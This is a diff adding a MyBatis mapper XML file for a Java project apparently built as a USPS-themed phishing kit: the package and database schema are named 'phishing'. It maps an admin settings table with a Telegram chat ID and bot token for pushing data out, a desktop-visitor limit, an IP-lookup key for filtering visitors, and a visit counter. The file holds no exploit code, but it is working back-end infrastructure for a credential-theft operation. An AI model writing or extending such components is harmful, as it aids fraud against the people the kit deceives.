@@ -1,0 +1,82 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
+<mapper namespace="com.uspsassa.phishing.mapper.SettingMapper">
+    <resultMap id="BaseResultMap" type="com.uspsassa.phishing.entity.Setting">
+        <!--@mbg.generated-->
+        <!--@Table phishing.tb_setting-->
+        <result column="telegram_push" jdbcType="BOOLEAN" property="telegramPush"/>
+        <result column="telegram_id" jdbcType="VARCHAR" property="telegramId"/>
+        <result column="telegram_token" jdbcType="VARCHAR" property="telegramToken"/>
+        <result column="sync" jdbcType="BOOLEAN" property="sync"/>
+        <result column="cart_filter" jdbcType="BOOLEAN" property="cartFilter"/>
+        <result column="linit_desktop" jdbcType="BOOLEAN" property="linitDesktop"/>
+        <result column="visitCount" jdbcType="INTEGER" property="visitCount"/>
+        <result column="token_key" jdbcType="VARCHAR" property="tokenKey"/>
+        <result column="ipregister_key" jdbcType="VARCHAR" property="ipregisterKey"/>
+    </resultMap>
+    <sql id="Base_Column_List">
+        <!--@mbg.generated-->
+        telegram_push,
+        telegram_id,
+        telegram_token,
+        sync,
+        cart_filter,
+        linit_desktop,
+        visitCount,
+        token_key,
+        ipregister_key
+    </sql>
+
+    <select id="getSetting" resultMap="BaseResultMap">
+        <!--@mbg.generated-->
+        select
+        <include refid="Base_Column_List"/>
+        from phishing.tb_setting
+    </select>
+    <update id="updateSetting" parameterType="com.uspsassa.phishing.entity.Setting">
+        update phishing.tb_setting
+        <set>
+            <if test="telegramPush != null">
+                telegram_push = #{telegramPush,jdbcType=BOOLEAN},
+            </if>
+            <if test="telegramId != null">
+                telegram_id = #{telegramId,jdbcType=VARCHAR},
+            </if>
+            <if test="telegramToken != null">
+                telegram_token = #{telegramToken,jdbcType=VARCHAR},
+            </if>
+            <if test="sync != null">
+                sync = #{sync,jdbcType=BOOLEAN},
+            </if>
+            <if test="cartFilter != null">
+                cart_filter = #{cartFilter,jdbcType=BOOLEAN},
+            </if>
+            <if test="linitDesktop != null">
+                linit_desktop = #{linitDesktop,jdbcType=BOOLEAN},
+            </if>
+            <if test="visitCount != null">
+                visitCount = #{visitCount,jdbcType=INTEGER},
+            </if>
+            <if test="tokenKey != null">
+                token_key = #{tokenKey,jdbcType=VARCHAR},
+            </if>
+            <if test="ipregisterKey != null">
+                ipregister_key = #{ipregisterKey,jdbcType=VARCHAR},
+            </if>
+        </set>
+    </update>
+
+    <update id="addVisitCount">
+        update phishing.tb_setting
+        <set>
+            visitCount = visitCount + 1
+        </set>
+    </update>
+
+    <select id="clearVisitCount">
+        update phishing.tb_setting
+        <set>
+            visitCount = 0
+        </set>
+    </select>
+</mapper>
